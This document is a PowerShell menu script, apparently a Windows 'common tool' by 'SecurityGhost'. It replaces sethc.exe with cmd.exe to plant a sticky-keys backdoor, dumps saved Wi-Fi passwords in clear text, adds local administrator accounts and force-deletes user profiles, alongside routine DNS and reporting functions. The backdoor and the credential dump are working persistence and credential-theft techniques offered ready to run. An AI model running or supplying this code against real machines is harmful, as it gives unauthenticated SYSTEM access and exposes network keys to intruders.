```powershell
# Developer: Joseph Quigley 
# Date: 02/13/19

# Requires -Version 3 -RunAsAdministrator

#region Functions

function Write-Log {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [ValidateSet("INFO","WARN","ERROR","FATAL","DEBUG")]
        [String]$Level = "INFO",

        [Parameter(Mandatory=$True)]
        [string]$Message,

        [Parameter(Mandatory=$False)]
        [string]$logfile
    )

    $Stamp = (Get-Date).ToString("yyyy/MM/dd HH:mm:ss")
    $Line = "$Stamp $Level $Message"
    if ($logfile) {
        Add-Content -Path $logfile -Value $Line
    } else {
        Write-Output $Line
    }
}

function Show-Menu {
    param (
        [string]$Title = 'Powershell Common Tool Script'
    )
    Clear-Host
    Write-Host "=========== $Title ==========="
    Write-Host "=========== Version 2.2 ==========="
    Write-Host "1: Press '1' for StickyKeys."
    Write-Host "2: Press '2' to Implement Clean user profile."
    Write-Host "3: Press '3' to Reset Settings."
    Write-Host "4: Press '4' to Refresh Wifi Settings."
    Write-Host "5: Press '5' to Grab Wifi Passwords."
    Write-Host "6: Press '6' to Generate system reports."
    Write-Host "7: Press '7' to Add a New Admin Account."
    Write-Host "Q: Press 'Q' to quit."
    Write-Host "=========== By SecurityGhost ==========="
}

function Enable-StickyKey {
    try {
        Takeown /F "C:\Windows\System32\cmd.exe" /D Y
        Takeown /F "C:\Windows\System32\sethc.exe" /D Y
        Icacls "C:\Windows\System32\cmd.exe" /grant "%username%":F 
        Icacls "C:\Windows\System32\sethc.exe" /grant "%username%":F
        Move-Item -Path "C:\Windows\System32\sethc.exe" -Destination "C:\Windows\System32\sethc.old.exe" -Force
        Copy-Item -Path "C:\Windows\System32\cmd.exe" -Destination "C:\Windows\System32\sethc.exe" -Force
    } catch {
        Write-Log -Level "ERROR" -Message "Failed to enable StickyKey: $_"
    }
}

function Remove-UserProfile {
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$false)]
        [String[]]$Exclude,
        [Parameter(Position=1, Mandatory=$false)]
        [DateTime]$Before,
        [Parameter(Position=2, Mandatory=$false)]
        [Switch]$DirectoryCleanup
    )

    Write-Verbose "Gathering List of Profiles on $env:COMPUTERNAME to Remove..."

    $userProfileFilter = "Loaded = 'False' AND Special = 'False'"
    $cleanupExclusions = @("Administrator", "All Users", "UpdatusUser", "Default", "Default User", "Public", "Guest", "josep")

    if ($Exclude) {
        foreach ($exclusion in $Exclude) {
            $userProfileFilter += " AND NOT LocalPath LIKE '%$exclusion%'"
            $cleanupExclusions += $exclusion
        }
    }

    if ($Before) {
        $userProfileFilter += " AND LastUseTime < '$Before'"

        $keepUserProfileFilter = "Special = 'False' AND LastUseTime >= '$Before'"
        $profilesToKeep = Get-WmiObject -Class Win32_UserProfile -Filter $keepUserProfileFilter -ErrorAction Stop

        foreach ($profileToKeep in $profilesToKeep) {
            try {
                $userSID = New-Object -TypeName System.Security.Principal.SecurityIdentifier($profileToKeep.SID)
                $userName = $userSID.Translate([System.Security.Principal.NTAccount])
                $keepUserName = $userName.Value -replace ".*\\", ""
                $cleanupExclusions += $keepUserName
            } catch [System.Security.Principal.IdentityNotMappedException] {
                Write-Warning "Cannot Translate SID to UserName - Not Adding Value to Exceptions List"
            }
        }
    }

    $profilesToDelete = Get-WmiObject -Class Win32_UserProfile -Filter $userProfileFilter -ErrorAction Stop

    if ($DirectoryCleanup) {
        $usersChildItem = Get-ChildItem -Path "C:\Users" -Exclude $cleanupExclusions

        foreach ($usersChild in $usersChildItem) {
            if ($profilesToDelete.LocalPath -notcontains $usersChild.FullName) {    
                try {
                    Write-Verbose "Additional Directory Cleanup - Removing $($usersChild.Name) on $env:COMPUTERNAME..."
                    Remove-Item -Path $($usersChild.FullName) -Recurse -Force -ErrorAction Stop
                } catch [System.InvalidOperationException] {
                    Write-Verbose "Skipping Removal of $($usersChild.Name) on $env:COMPUTERNAME as Item is Currently In Use..."
                }
            }
        }
    }

    foreach ($profileToDelete in $profilesToDelete) {
        Write-Verbose "Removing Profile $($profileToDelete.LocalPath) & Associated Registry Keys on $env:COMPUTERNAME..."
        Remove-WmiObject -InputObject $profileToDelete -ErrorAction Stop
    }

    Get-ChildItem -Path "C:\Users" | Select-Object -Property Name, FullName, LastWriteTime
}

function Reset-Settings {
    try {
        secedit /configure /cfg "$Env:WinDir\inf\defltbase.inf" /db defltbase.sdb /verbose
    } catch {
        Write-Log -Level "ERROR" -Message "Failed to reset settings: $_"
    }
}

function Refresh-Wifi {
    try {
        Clear-DnsClientCache
        Register-DnsClient
        $GWNic = (Get-NetIPConfiguration -All | Where-Object { $_.IPv4DefaultGateway -ne $null }).InterfaceIndex
        Set-DnsClientServerAddress -InterfaceIndex $GWNic -ServerAddresses ("8.8.8.8", "8.8.4.4", "2001:4860:4860::8888", "2001:4860:4860::8844")
    } catch {
        Write-Log -Level "ERROR" -Message "Failed to refresh WiFi settings: $_"
    }
}

function Show-Wifi {
    [CmdLetBinding()]
    param([string]$network)

    try {
        if ($network) {
            Write-Host "Wireless Network Details:" -ForegroundColor Cyan
            Write-Host "===================================" -ForegroundColor Gray
            netsh.exe wlan show profiles name=$network key=clear
            Write-Host "===================================" -ForegroundColor Gray
        } else {
            $networks = netsh.exe wlan show profiles key=clear | Select-String -Pattern "All"
            $networkNames = ($networks -split ":") | Where-Object { $_ -notmatch "All" } | ForEach-Object { $_.Trim() }

            Write-Host "Wireless Networks and Passwords" -ForegroundColor Cyan
            Write-Host "===================================" -ForegroundColor Gray
            Write-Host "SSID : Password" -ForegroundColor Gray
            
            foreach ($ap in $networkNames) {
                try {
                    $password = netsh.exe wlan show profiles name=$ap key=clear | Select-String -Pattern "Key" | Select-String -NotMatch "Index"
                    $passwordDetail = ($password -split ":") | Select-Object -Last 1 | ForEach-Object { $_.Trim() }
                    Write-Host "$ap : $passwordDetail" -ForegroundColor Green
                } catch {
                    Write-Host "Unable to obtain password for $ap - Likely using 802.1x or Open Network" -ForegroundColor Red
                }
            }
            Write-Host "===================================" -ForegroundColor Gray
        }
    } catch {
        Write-Log -Level "ERROR" -Message "Failed to show WiFi details: $_"
    }
}

function Get-Reports {
    try {
        $basedpath = "$env:USERPROFILE\Desktop\reports"
        New-Item -Path $basedpath -ItemType Directory -Force

        net start | Out-File -FilePath "$basedpath\services.txt"
        tasklist /svc | Out-File -FilePath "$basedpath\processes.txt"
        netstat /a /b | Out-File -FilePath "$basedpath\netstat.txt"
        driverquery | Out-File -FilePath "$basedpath\driverinfo.txt"

        "All user Accounts:" | Out-File -FilePath "$basedpath\usersreport.txt"
        Get-WmiObject -Class Win32_UserAccount -Filter 'LocalAccount=TRUE' | Select-Object -ExpandProperty Name | Out-File -Append -FilePath "$basedpath\usersreport.txt"
        "" | Out-File -Append -FilePath "$basedpath\usersreport.txt"
        "Admin

 Accounts:" | Out-File -Append -FilePath "$basedpath\usersreport.txt"
        net localgroup administrators | Where-Object { $_ -and $_ -notmatch "command completed successfully" } | Select-Object -Skip 4 | Out-File -Append -FilePath "$basedpath\usersreport.txt"
        "" | Out-File -Append -FilePath "$basedpath\usersreport.txt"
        "Disabled Accounts:" | Out-File -Append -FilePath "$basedpath\usersreport.txt"
        Get-WmiObject -Class Win32_UserAccount -Filter 'Disabled=TRUE or Lockout=TRUE' | Select-Object -ExpandProperty Name | Out-File -Append -FilePath "$basedpath\usersreport.txt"

        $Include = @('*.mp3','*.mp4','*.m4a','*.jpg','*.jpeg','*.wav','*.ogg','*.wma','*.mov','*.mp4v','*.mpeg4','*.gif','*.png')
        $exclude = [RegEx]'^C:\\Windows|^C:\\Program Files'
        Get-ChildItem -Path "C:\" -Directory |
            Where-Object { $_.FullName -notmatch $exclude } | ForEach-Object {
                Get-ChildItem -Path $_.FullName -Include $Include -Recurse | 
                Select-Object -ExpandProperty FullName | Out-File -Append -FilePath "$basedpath\media.txt"
            }
    } catch {
        Write-Log -Level "ERROR" -Message "Failed to generate system reports: $_"
    }
}

function Add-Admin {
    param (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$User,

        [Parameter(Mandatory=$true, Position=1)]
        [string]$Password 
    )

    try {
        $Pwd = ConvertTo-SecureString $Password -AsPlainText -Force
        New-LocalUser -Name $User -Password $Pwd
        Add-LocalGroupMember -Group "Administrators" -Member $User
    } catch {
        Write-Log -Level "ERROR" -Message "Failed to add new admin account: $_"
    }
}

#endregion Functions

#region Menu

do {
    Show-Menu
    Write-Host
    $selection = Read-Host -Prompt "Please make a selection"
    switch ($selection) {
        '1' { Enable-StickyKey } 
        '2' { Remove-UserProfile -DirectoryCleanup } 
        '3' { Reset-Settings } 
        '4' { Refresh-Wifi } 
        '5' { Show-Wifi }
        '6' { Get-Reports } 
        '7' {
            $User = Read-Host -Prompt "Username"
            $Password = Read-Host -Prompt "Password"
            Add-Admin -User $User -Password $Password
        }
    }
    pause
} until ($selection -eq 'q')

#endregion Menu
```